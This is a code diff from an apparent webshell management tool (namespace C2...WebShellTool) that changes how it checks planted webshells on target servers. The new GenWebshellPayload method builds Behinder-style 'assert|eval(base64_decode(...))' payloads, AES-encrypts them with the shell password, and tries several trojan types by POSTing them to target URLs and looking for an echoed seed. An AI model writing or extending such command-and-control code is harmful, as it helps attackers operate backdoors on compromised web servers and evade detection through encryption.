@@ -596,22 +596,14 @@ namespace C2.Business.CastleBravo.WebShellTool
                 string url = NetUtil.FormatUrl(task.Url);
                 string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
                 string result = "";
-                if (task.TrojanType != "自动判断")
+                List<string> payloads = GenWebshellPayload(task, seed);
+                foreach (string payload in payloads)
                 {
-                    result = WebClientEx.Post(url, GenBehinder3Payload(task, seed), 1500, Proxy);
-                    return result.Contains(seed);
+                    result = WebClientEx.Post(url, payload, 1500, Proxy);
+                    if (result.Contains(seed))
+                        return true;
                 }
-                else
-                { 
-                    foreach(string type in Global.TrojanTypes)
-                    {
-                        result = WebClientEx.Post(url, GenBehinder3Payload(task, seed, type), 1500, Proxy);
-                        if (result.Contains(seed))
-                            return true;
-                    }
-                    return false;
-                }
-
+                return false;
             }
             catch { return false; }
 
@@ -633,18 +625,31 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             }
         }
-        private string GenBehinder3Payload(WebShellTaskConfig task, string seed,string giventype ="")
+        private List<string> GenWebshellPayload(WebShellTaskConfig task, string seed)
         {
+            List<string> payloads = new List<string>();
             string pass = task.Password;
             // 默认按php算
-            string payload = giventype.IsNullOrEmpty() ? GenPayload(task.TrojanType, seed) :
-                             GenPayload(giventype, seed);
+            string payload = GenPayload(task.TrojanType, seed);
+
             if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
             {
-                string behinderPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
-                return ClientSetting.Encrypt(behinderPayload, pass);
+                string bxPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
+                payloads.Add(ClientSetting.Encrypt(bxPayload, pass));
+                if (Regex.IsMatch(pass,"[a-f0-9]{16}"))
+                    payloads.Add(ST.AES128CBCEncrypt(bxPayload, pass));
             }
-            return pass + "=" + payload;
+            else if (task.TrojanType != "自动判断")
+            {
+                payloads.Add(pass + "=" + payload);
+            }
+            else
+            {
+                foreach (string type in Global.TrojanTypes)
+                    payloads.Add(pass + "=" + GenPayload(type, seed));
+            }
+            return payloads;
+
         }
        
         private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
